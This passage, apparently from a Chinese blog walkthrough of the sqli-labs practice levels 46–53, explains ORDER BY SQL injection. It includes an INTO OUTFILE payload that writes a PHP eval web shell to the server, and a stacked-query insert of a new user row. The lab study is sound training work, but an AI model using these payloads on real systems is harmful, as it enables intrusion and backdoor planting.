+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 and &quot;&lt;?php @eval($_POST[cmd]);?&gt;&quot; into outfile &#x27;D:/phpstudy_pro/WWW/sqli/sqli/Less-46/123.php&#x27;</span><br></pre></td></tr></table></figure>
+<p><strong>46关</strong>是数字型注入，<strong>47关</strong>是单引号字符型注入，<strong>48关</strong>是数字型盲注，<strong>49关</strong>是单引号字符型盲注。</p>
+<hr>
+<p><strong>五十关</strong><br>也是order by注入 和前几关差不多<br>只是多了mysqli_multi_query()函数<br>我们不仅可以用前几关的方法，同时还能用堆叠注入。<br>语句差不多</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1;insert%20into%20users(id,username,password)values(99,%27123%27,%27456%27)</span><br></pre></td></tr></table></figure>
+<p><strong>50关</strong>是数字型注入，<strong>51关</strong>是单引号字符型注入，<strong>52关</strong>是数字型盲注，<strong>53关</strong>是单引号字符型盲注。</p>
+<hr>
+<p>至此，sqllab前三章结束。</p>
+
+                </section>
+
+                
+                
+
+                
+
+            </article>
+
+            
+            <nav class="dis_flex al_post_nav">
+                <a class="al_post_nav_item dis_flex_acenter" href="/">
+                    
+                </a>
+                <a class="al_post_nav_item dis_flex_acenter" href="/2022/11/19/sqli-lab-less24/">
+                    
+                        <span class="al_text_ellipsis al_post_nav_desc">sqli-lab-less24-28</span>
+                        <svg class="al_arrow">
+                            <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-arrow-right"></use>
+                        </svg>
+                    
+                </a>
+            </nav>
+        </div>
+    </div>
+
+
+        <div class="al_index_footer dis_flex_center">
+    <div class="al_index_footer_item al_index_footer_title">
+        John Doe
+    </div>
+
+    
+    
+
+    <div class="al_index_footer_item al_index_footer_extra">
+        Created By 
+        <a target="_blank" rel="noopener" href="https://github.com/iGuan7u/Acetolog">AcetoLog</a>
+         · Power By 
+        <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>
+    </div>
+
+    <div class="al_index_footer_item al_index_footer_extra_right">
+        All Right Reserved
+    </div>
+</div>
+
+        <script type="text/javascript" async="async" src="/javascripts/acelog.js"></script>
+        
+        
+        
+        
+        
+
+    </body>
+</html>
